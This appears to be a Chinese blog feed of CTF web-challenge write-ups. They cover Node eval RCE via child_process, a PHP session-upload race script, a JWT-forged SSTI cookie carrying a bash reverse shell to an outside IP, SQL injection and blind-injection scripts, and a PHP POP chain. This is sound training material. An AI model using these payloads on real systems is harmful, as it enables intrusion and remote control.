class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line"> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> username=req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">var</span> password=req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username||password)&#123;</span><br><span class="line">        <span class="keyword">if</span>(username.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>))&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;you not the true admin&#x27;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(username==admin.<span class="property">username</span>&amp;&amp;password===admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>))&#123;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">                  req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;isadmin&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                  req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username&#125;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">12354325</span>)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please enter usrname or password&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isadmin</span>===<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> cmd=req.<span class="property">query</span>.<span class="property">cmd</span>;</span><br><span class="line">        <span class="keyword">if</span>(cmd)&#123;</span><br><span class="line">           res.<span class="title function_">send</span>( <span class="built_in">eval</span>(cmd))</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;give me you cmd&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;81&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:81`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>有三个路由，&#x2F;，&#x2F;login，&#x2F;admin</p>
<p>先找能利用的点，在&#x2F;admin路由里，有eval可以执行命令，想要使用需要让<code>req.session.user.isadmin===&#39;1&#39;</code></p>
<p>看&#x2F;login路由</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162256561.png" alt="image-20230503162256561"></p>
<p>满足<code>username==admin.username&amp;&amp;password===admin.password.substring(1,6)</code>即可让<code>req.session.user.isadmin===&#39;1&#39;</code>但是需要绕过</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162405157.png" alt="image-20230503162405157"></p>
<p>而设置的admin的username和password是</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162626184.png" alt="image-20230503162626184"></p>
<p>因为includes函数，不能直接传username为admin</p>
<p>查询资料查到js的includes函数处理字符串和数字是不一样的</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503163943355.png" alt="image-20230503163943355"></p>
<p>使用数组就可以绕过，再看password，<code>substring(1,6)</code>函数是截取第二个导到第六个字符</p>
<p>而这个有个表情符号，这个算两个字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先将😍admin😍进行unicode编码</span><br><span class="line">为\ud83d\ude0d\u0061\u0064\u006d\u0069\u006e\ud83d\ude0d</span><br><span class="line">选取第二个到第六个字节就是</span><br><span class="line">\ude0d\u0061\u0064\u006d\u0069</span><br></pre></td></tr></table></figure>

<p>然后进行json传参</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503164342117.png" alt="image-20230503164342117"></p>
<p>访问&#x2F;admin，成功访问</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503164407098.png" alt="image-20230503164407098"></p>
<p>最后get传参cmd为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure>

<p>成功将flag下载下来</p>
<h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>include条件竞争，过滤了很多，基本锁死了</p>
<p>最后是一个session文件包含，使用条件竞争</p>
<p>py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;e063jurhs0etba9hlo4207r124&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://81.70.221.206:9289/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#双线程运行</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure>







]]></content>
  </entry>
  <entry>
    <title>Drink from my Flask#1(HeroCTF 2023)</title>
    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
<span id="more"></span>

<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
<p>输入试试</p>
<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
<p>访问&#x2F;admin，显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;adminPage</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>

<p>看cookie</p>
<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
<p>是jwt</p>
<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
<p>但是没有密钥，使用jwt_tool暴力破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>

<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
<p>得到密钥是key，进行伪造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>

<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
<p>将cookie换成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>

<p>刷新网页</p>
<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
<p>再伪造一个</p>
<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
<p>cookie换成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>

<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
<p>有ssti</p>
<p>再伪造命令执行</p>
<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
<p>使用cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>

<p>使用云服务器监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>

<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
]]></content>
  </entry>
  <entry>
    <title>buu的SQL</title>
    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[极客大挑战 2019]LoveSQL	[极客大挑战 2019]BabySQL	[极客大挑战 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 华北赛区 Day2 Web1]Hack World</p>
<span id="more"></span>

<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>1.先使用万能密码1’ or 1&#x3D;1#进行尝试查看是否有回显，查看存在回显</p>
<p>2.查看字段数，使用order by或者union select，因为是在http行进行的输入#注释无法使用，所以使用%23来进行注释</p>
<p>3.经过试验有3个字段，然后进行联合注入即可</p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>1.经过试验存在union，select，or，注释符，and，from，where及其他过滤，但是可以使用%23进行注释，这里可以都是用双写绕过</p>
<p>2.使用万能密码，存在回显</p>
<p>3.使用联合注入check.php?username&#x3D;1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123来爆出所有的库</p>
<p>4.选用ctf库，进行爆表名为flag，再爆字段也为flag</p>
<p>5.最后爆数据</p>
<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>1.存在空格，union，and，&#x3D;，过滤</p>
<p>2.使用报错型注入，注入时的语句不可以带有空格，使用check.php?username&#x3D;1&amp;password&#x3D;1’or(extractvalue(1,concat(0x7e,(select(database())))))%23来爆出数据库</p>
<p>3.然后继续使用报错型注入来爆表，字段，</p>
<p>4.获得数据时flag无法显示完全，使用left()和right()函数来获得全部数据，例如group_concat(right(password,32))</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()和right()函数用法</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_string可以是文字字符串，变量或列。</span><br><span class="line">number_of_characters是一个正整数，指定将返回input_string的字符数。</span><br></pre></td></tr></table></figure>

<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.存在()过滤，使用union盲注</p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>1.该关是盲注，并且存在过滤，打开网页上已经提示flag在flag表的flag列</p>
<p>2.输入1发现返回Hello, glzjin wants a girlfriend.输入2返回Do you want to be my girlfriend?</p>
<p>3.利用1和2返回的值进行构造if(substr((select(flag)from(flag)),1,1)&#x3D;’’,1,2)如果正确就会返回输入1时的内容，不正确就会返回输入2时的内容</p>
<p>4.然后写盲注脚本(有点小问题)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>DASCTF X GFCTF 2022的web部分解题</title>
    <url>/2023/04/16/DASCTF%20X%20GFCTF%202022/</url>
    <content><![CDATA[<p>EasyPOP	EasyLove</p>
<span id="more"></span>

<h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>1.源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显的反序列化</p>
<p>看见有四个类，分别是<code>fine，show，sorry，secret_code</code></p>
<p>看到一个调用函数<code>call_user_func()</code>，这个可以利用，接下来就是看怎么可以调用到这里</p>
<p>2.想要调用<code>call_user_func()</code>函数，需要用到<code>__invoke</code>方法，<code>__invoke</code>方法当用一个调用函数的方式来调用对象会自动使用</p>
<p><code>sorry</code>类中有一个<code>name();</code>可以利用这个，想要利用这个还得用到<code>__get</code>方法，<code>__get</code>方法调用一个不存在的属性时调用</p>
<p><code>secret_code</code>类中有<code>return $this-&gt;code-&gt;secret;</code>，但是代码中并没有secret属性，可以调用<code>__get</code>方法</p>
<p><code>show()</code>方法怎样调用呢，<code>show</code>类的<code>__toString</code>方法可以调用<code>show()</code>方法，<code>__toString</code>方法当对象被当作字符串使用会调用</p>
<p><code>sorry类</code>中<code>__destruct</code>方法的<code>echo $this-&gt;hint;</code>可以利用</p>
<p>3.pop链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorry:__destruct -&gt; show:__toString -&gt; secret_code:show() -&gt; sorry:__get -&gt; fine:__invoke</span><br></pre></td></tr></table></figure>

<p>由于想要利用<code>sorry</code>类中的<code>hint</code>属性，需要先通过<code>if ($this-&gt;password == $this-&gt;name)</code>，但是代码中有<code>setPassword(md5(mt_rand()));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>会给<code>password</code>随机赋值，通过弱等于，可以让<code>name</code>等于<code>0</code></p>
